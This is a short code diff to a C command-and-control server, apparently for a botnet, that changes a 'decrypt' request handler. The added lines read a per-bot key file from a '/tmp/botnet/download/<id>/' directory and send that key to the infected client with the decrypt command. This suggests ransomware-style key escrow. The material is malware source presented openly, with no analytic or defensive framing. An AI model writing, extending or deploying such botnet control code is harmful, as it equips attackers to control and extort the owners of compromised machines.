@@ -240,6 +240,28 @@ void handle_decrypt_request(struct mg_connection *c, struct mg_http_message *hm)
         mg_http_reply(c, 404, "Content-Type: application/json\r\n", "{\"error\":\"Bot not found\"}");
         return;
     }
+    char file_path_to_key[512];
+    snprintf(file_path_to_key, sizeof(file_path_to_key),
+             "/tmp/botnet/download/%s/31d6cfe0d16ae931b73c59d7e0c089c0.log",
+             client->id);
+
+    FILE *fp = fopen(file_path_to_key, "r");
+    if (!fp) {
+        output_log("Failed to open key file: %s\n", LOG_ERROR, LOG_TO_ALL, file_path_to_key);
+        return;
+    }
+
+    if (fgets(key, STRLEN, fp) == NULL) {
+        output_log("Failed to read key from file: %s\n", LOG_ERROR, LOG_TO_ALL, file_path_to_key);
+        fclose(fp);
+        return;
+    }
+
+    // Supprime le saut de ligne éventuel
+    key[strcspn(key, "\r\n")] = '\0';
+
+    fclose(fp);
+    
 
     // Build the Command struct
     Command cmd = {
@@ -252,7 +274,8 @@ void handle_decrypt_request(struct mg_connection *c, struct mg_http_message *hm)
     };
 
     cmd.params[0] = strdup(file_path); // Add the file path as the first parameter
-    cmd.params[1] = NULL; // Null-terminate the params array
+    cmd.params[1] = strdup(key);
+    cmd.params[2] = NULL; // Null-terminate the params array
 
     // Send the command to the client
     if (send_command(client->socket, &cmd) < 0) {
